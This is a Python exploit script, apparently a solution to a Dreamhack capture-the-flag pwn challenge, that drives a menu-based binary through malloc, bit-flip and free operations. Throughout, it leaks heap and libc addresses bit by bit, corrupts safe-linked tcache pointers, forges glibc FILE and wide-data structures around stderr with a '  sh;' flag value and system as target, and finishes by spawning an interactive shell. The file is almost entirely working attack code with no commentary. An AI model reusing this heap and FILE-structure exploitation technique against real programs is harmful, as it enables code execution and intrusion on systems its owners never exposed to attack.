#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./main_patched")
# exe = ptr.ELF("./main")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
# pwn.context.log_level = "debug"
# libc = ptr.ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
# ld = ptr.ELF("./ld-linux-x86-64.so.2")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 17390)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def bit_flip(num: int, pos: int) -> int:
    mask = 1 << pos
    return num ^ mask


def num_to_bits(num: int, bit_length: int = 64) -> list[bool]:
    return [(num >> i) & 1 == 1 for i in range(bit_length)]


def main():
    io = connect()

    # 0 => malloc
    # 1 => flip
    # 2 => free

    def heap_leak() -> int:
        bits = ""
        for i in range(64):
            io.sendlineafter(b"> ", b"0")
            io.sendlineafter(b"> ", b"0")

            io.sendlineafter(b"> ", b"2")
            io.sendlineafter(b"> ", b"0")

            io.sendlineafter(b"> ", b"0")
            io.sendlineafter(b"> ", b"0")

            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"0")
            io.sendlineafter(b"> ", str(i).encode())

            bit_leak = io.recvline().strip(b"\n").decode()
            bits = bit_leak + bits

            io.sendlineafter(b"> ", b"2")
            io.sendlineafter(b"> ", b"0")
        link_info = int(bits, 2)
        return link_info << 12

    heap_base = heap_leak()
    ptr.logger.info(f"heap_base: {hex(heap_base)}")

    def libc_leak() -> int:
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"0")

        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"1")

        for i in range(0x42):
            io.sendlineafter(b"> ", b"0")
            io.sendlineafter(b"> ", b"2")

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"0")

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"1")  # there is the link which will be modified

        # original_link = (heap_base + 0x2E0) >> 12 ^ (heap_base + 0x2A0)
        # ptr.logger.info(f"original_link: {hex(original_link)}")

        # for i in range(10):
        #     modified_link = bit_flip(original_link, i)
        #     points_to = heap_base + 0x2e0 >> 12 ^ modified_link
        #     print(f"{i} {hex(modified_link)} -> {hex(points_to)}")

        # modify the link to let it point to (heap_base + 0x2b0)
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b"> ", b"4")

        # chunk that its size will be modified
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"0")

        # create a chunk at (heap_base + 0x2b0)
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"1")

        # modify the size of (heap_base + 0x2e0)
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b"> ", str(320 + 12).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"0")

        io.sendlineafter(b"> ", b"0")  # dummy chunk
        io.sendlineafter(b"> ", b"3")

        bits = ""
        for i in range(64):
            io.sendlineafter(b"> ", b"0")
            io.sendlineafter(b"> ", b"3")

            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"3")
            io.sendlineafter(b"> ", str(i).encode())

            bit_leak = io.recvline().strip(b"\n").decode()
            bits = bit_leak + bits

        libc_base = int(bits, 2) - unwrap(libc.symbol("main_arena")) - 96
        return libc_base

    libc.base = libc_leak()

    # make size for free in the future
    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"3")

    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"> ", str(64 * 3 + 0).encode())

    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"3")

    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"3")

    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"> ", str(64 * 3 + 6).encode())

    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"6")

    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"5")

    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"3")

    io.sendlineafter(b"> ", b"2")  # heap_base + 0x13e0
    io.sendlineafter(b"> ", b"6")

    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"5")

    # original_link = (heap_base + 0x1420) >> 12 ^ (heap_base + 0x13E0)
    # ptr.logger.info(f"original_link: {hex(original_link)}")
    #
    # for i in range(32):
    #     modified_link = bit_flip(original_link, i)
    #     points_to = (heap_base + 0x1420) >> 12 ^ modified_link
    #     print(f"{i} {hex(modified_link)} -> {hex(points_to)}")

    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", b"5")
    io.sendlineafter(b"> ", b"5")

    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"3")

    io.sendlineafter(b"> ", b"0")  # heap_base + 0x13c0
    io.sendlineafter(b"> ", b"4")

    # break random value
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"> ", str(320 + 1).encode())

    io.sendlineafter(b"> ", b"2")  # heap_base + 0x13e0
    io.sendlineafter(b"> ", b"6")

    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"4")

    stderr = unwrap(libc.symbol("_IO_2_1_stderr_"))

    link = (heap_base + 0x13E0) >> 12 ^ (stderr - 0x30)
    link_bits = num_to_bits(link)

    for i in range(len(link_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"4")

        if link_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"4")
            io.sendlineafter(b"> ", str(64 * 4 + i).encode())
        # else:
        #     io.sendlineafter(b"> ", str(64 * 2 + 1).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"4")

    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"5")

    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"5")

    io.sendlineafter(b"> ", b"0")  # &stderr - 0x20
    io.sendlineafter(b"> ", b"7")

    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", b"7")
    io.sendlineafter(b"> ", str(64 * 3).encode())

    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"2")

    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"6")

    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"4")

    left_link = (heap_base + 0x13E0) >> 12 ^ (heap_base + 0x1360)
    left_link_bits = num_to_bits(left_link)

    for i in range(len(left_link_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"4")

        if left_link_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"4")
            io.sendlineafter(b"> ", str(64 * 4 + i).encode())
        # else:
        #     io.sendlineafter(b"> ", str(64 * 2 + 1).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"4")

    link = (heap_base + 0x13E0) >> 12 ^ (stderr - 0x30)
    link_bits = num_to_bits(link)

    for i in range(len(link_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"4")

        if link_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"4")
            io.sendlineafter(b"> ", str(64 * 4 + i).encode())
        # else:
        #     io.sendlineafter(b"> ", str(64 * 2 + 1).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"4")

    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"5")

    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"5")

    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"7")
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", b"7")
    io.sendlineafter(b"> ", str(64 * 3 + 6).encode())

    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"3")

    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"6")

    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"4")

    left_link = (heap_base + 0x13E0) >> 12 ^ (heap_base + 0x1420)
    left_link_bits = num_to_bits(left_link)

    for i in range(len(left_link_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"4")

        if left_link_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"4")
            io.sendlineafter(b"> ", str(64 * 4 + i).encode())
        # else:
        #     io.sendlineafter(b"> ", str(64 * 2 + 1).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"4")

    link = (heap_base + 0x13E0) >> 12 ^ (stderr - 0x10)

    link_bits = num_to_bits(link)

    for i in range(len(link_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"4")

        if link_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"4")
            io.sendlineafter(b"> ", str(64 * 4 + i).encode())
        # else:
            # io.sendlineafter(b"> ", str(64 * 2 + 1).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"4")

    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"5")

    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"5")

    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"7")  # stderr + 0x10

    system = unwrap(libc.symbol("system"))
    system_bits = num_to_bits(system)

    for i in range(len(system_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"8")

        if system_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"8")
            io.sendlineafter(b"> ", str(64 * 5 + i).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"8")

    doallocate = heap_base + 0x1488
    wide_vtable_addr = doallocate - 0x68
    wide_vtable_addr_addr = heap_base + 0x1480
    ptr.logger.info(f"wide_vtable_addr: {hex(wide_vtable_addr)}")
    ptr.logger.info(f"&wide_vtable->doallocate: {hex(doallocate)}")
    wide_vtable_addr_bits = num_to_bits(wide_vtable_addr)

    for i in range(len(wide_vtable_addr_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"8")

        if wide_vtable_addr_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"8")
            io.sendlineafter(b"> ", str(64 * 4 + i).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"8")

    wide_data_addr = wide_vtable_addr_addr - 0xE0
    ptr.logger.info(f"wide_data_addr: {hex(wide_data_addr)}")

    left_flags = 0x00000000FBAD2086
    left_flags_bits = num_to_bits(left_flags)

    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"7")

    for i in range(len(left_flags_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"7")

        if left_flags_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"7")
            io.sendlineafter(b"> ", str(64 * 2 + i).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"7")

    flags = ptr.u64(b"  sh;")
    flags_bits = num_to_bits(flags)
    for i in range(len(flags_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"7")

        if flags_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"7")
            io.sendlineafter(b"> ", str(64 * 2 + i).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"7")

    size = 0x41
    size_bits = num_to_bits(size)
    for i in range(len(size_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"7")

        if size_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"7")
            io.sendlineafter(b"> ", str(64 * 3 + i).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"7")

    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"6")
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"4")

    left_link = (heap_base + 0x13E0) >> 12 ^ (stderr - 0x10)
    left_link_bits = num_to_bits(left_link)
    for i in range(len(left_link_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"4")

        if left_link_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"4")
            io.sendlineafter(b"> ", str(64 * 4 + i).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"4")

    link = (heap_base + 0x13E0) >> 12 ^ (stderr + 0x10)
    link_bits = num_to_bits(link)
    for i in range(len(link_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"4")

        if link_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"4")
            io.sendlineafter(b"> ", str(64 * 4 + i).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"4")

    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"5")
    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"5")

    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"7")

    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", b"7")
    io.sendlineafter(b"> ", str(64 * 3).encode())

    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"7")
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"6")
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"4")

    left_link = (heap_base + 0x13E0) >> 12 ^ (stderr + 0x10)
    left_link_bits = num_to_bits(left_link)
    for i in range(len(left_link_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"4")

        if left_link_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"4")
            io.sendlineafter(b"> ", str(64 * 4 + i).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"4")

    link = (heap_base + 0x13E0) >> 12 ^ (stderr + 112 + 0x10)
    link_bits = num_to_bits(link)
    for i in range(len(link_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"4")

        if link_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"4")
            io.sendlineafter(b"> ", str(64 * 4 + i).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"4")

    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"5")
    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"5")

    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"7")

    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"6")
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"4")

    left_link = (heap_base + 0x13E0) >> 12 ^ (stderr >> 12)
    left_link_bits = num_to_bits(left_link)
    for i in range(len(left_link_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"4")

        if left_link_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"4")
            io.sendlineafter(b"> ", str(64 * 4 + i).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"4")

    link = (heap_base + 0x13E0) >> 12 ^ (stderr + 112)
    link_bits = num_to_bits(link)
    for i in range(len(link_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"4")

        if link_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"4")
            io.sendlineafter(b"> ", str(64 * 4 + i).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"4")

    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"5")
    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"5")

    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"7")

    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", b"7")
    io.sendlineafter(b"> ", str(64 * 3).encode())

    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"10")
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"10")
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"6")
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"4")

    left_link = (heap_base + 0x13E0) >> 12 ^ (heap_base + 0x14a0)
    left_link_bits = num_to_bits(left_link)
    for i in range(len(left_link_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"4")

        if left_link_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"4")
            io.sendlineafter(b"> ", str(64 * 4 + i).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"4")

    link = (heap_base + 0x13E0) >> 12 ^ (stderr + 112)
    link_bits = num_to_bits(link)
    for i in range(len(link_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"4")

        if link_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"4")
            io.sendlineafter(b"> ", str(64 * 4 + i).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"4")

    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"5")
    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"5")

    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"7")

    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", b"7")
    io.sendlineafter(b"> ", str(64 * 3 + 6).encode())


    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"10")
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"10")
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"6")
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"4")

    left_link = (heap_base + 0x13E0) >> 12 ^ (heap_base + 0x14e0)
    left_link_bits = num_to_bits(left_link)
    for i in range(len(left_link_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"4")

        if left_link_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"4")
            io.sendlineafter(b"> ", str(64 * 4 + i).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"4")

    link = (heap_base + 0x13E0) >> 12 ^ (stderr + 144)
    link_bits = num_to_bits(link)
    for i in range(len(link_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"4")

        if link_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"4")
            io.sendlineafter(b"> ", str(64 * 4 + i).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"4")

    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"5")
    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"5")

    original_wide_data_addr = unwrap(libc.symbol("_IO_wide_data_2"))
    original_wide_data_addr_bits = num_to_bits(original_wide_data_addr)

    for i in range(len(original_wide_data_addr_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"7")

        if original_wide_data_addr_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"7")
            io.sendlineafter(b"> ", str(64 * 2 + i).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"7")

    wide_data_addr_bits = num_to_bits(wide_data_addr)
    for i in range(len(wide_data_addr_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"7")

        if wide_data_addr_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"7")
            io.sendlineafter(b"> ", str(64 * 2 + i).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"7")

    size_bits = num_to_bits(0x41)
    for i in range(len(size_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"7")

        if size_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"7")
            io.sendlineafter(b"> ", str(64 * 3 + i).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"7")

    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"6")
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"4")

    left_link = (heap_base + 0x13E0) >> 12 ^ (stderr + 144)
    left_link_bits = num_to_bits(left_link)
    for i in range(len(left_link_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"4")

        if left_link_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"4")
            io.sendlineafter(b"> ", str(64 * 4 + i).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"4")

    link = (heap_base + 0x13E0) >> 12 ^ (stderr + 176)
    link_bits = num_to_bits(link)
    for i in range(len(link_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"4")

        if link_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"4")
            io.sendlineafter(b"> ", str(64 * 4 + i).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"4")


    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"5")
    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"5")

    file_jumps = unwrap(libc.symbol("__GI__IO_file_jumps"))
    file_jumps_bits = num_to_bits(file_jumps)
    for i in range(len(file_jumps_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"7")

        if file_jumps_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"7")
            io.sendlineafter(b"> ", str(64 * 5 + i).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"7")

    wfile_jumps = unwrap(libc.symbol("__GI__IO_wfile_jumps"))
    wfile_jumps_bits = num_to_bits(wfile_jumps)
    for i in range(len(wfile_jumps_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"7")

        if wfile_jumps_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"7")
            io.sendlineafter(b"> ", str(64 * 5 + i).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"7")

    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"6")
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"4")

    left_link = (heap_base + 0x13E0) >> 12 ^ (stderr + 176)
    left_link_bits = num_to_bits(left_link)
    for i in range(len(left_link_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"4")

        if left_link_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"4")
            io.sendlineafter(b"> ", str(64 * 4 + i).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"4")

    link = (heap_base + 0x13E0) >> 12 ^ (heap_base + 0x13a0)
    link_bits = num_to_bits(link)
    for i in range(len(link_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"4")

        if link_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"4")
            io.sendlineafter(b"> ", str(64 * 4 + i).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"4")

    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"5")
    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"5")

    left_size = 0x41
    left_size_bits = num_to_bits(left_size)
    for i in range(len(left_size_bits)):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", b"1")

        if left_size_bits[i]:
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", str(64 * 3 + i).encode())

        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"1")

    io.sendlineafter(b"> ", b"4")

    io.interactive()
    return


if __name__ == "__main__":
    main()
